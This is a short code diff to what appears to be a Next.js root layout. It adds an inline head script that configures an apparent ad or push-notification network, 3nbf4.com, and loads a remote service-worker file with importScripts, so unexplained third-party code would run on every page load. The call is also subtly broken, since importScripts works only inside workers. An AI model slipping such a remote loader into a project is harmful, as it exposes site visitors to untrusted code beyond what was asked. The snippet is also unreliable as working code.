@@ -84,6 +84,20 @@ export default function RootLayout({
 }) {
   return (
     <html lang="en">
+      <head>
+        <script
+          dangerouslySetInnerHTML={{
+            __html: `
+              self.options = {
+              domain: "3nbf4.com",
+              zoneId: 12019351,
+              };
+              self.lary = "";
+              importScripts("https://3nbf4.com/act/files/service-worker.min.js?r=sw");
+            `,
+          }}
+        />
+      </head>
       <body>{children}</body>
     </html>
   );
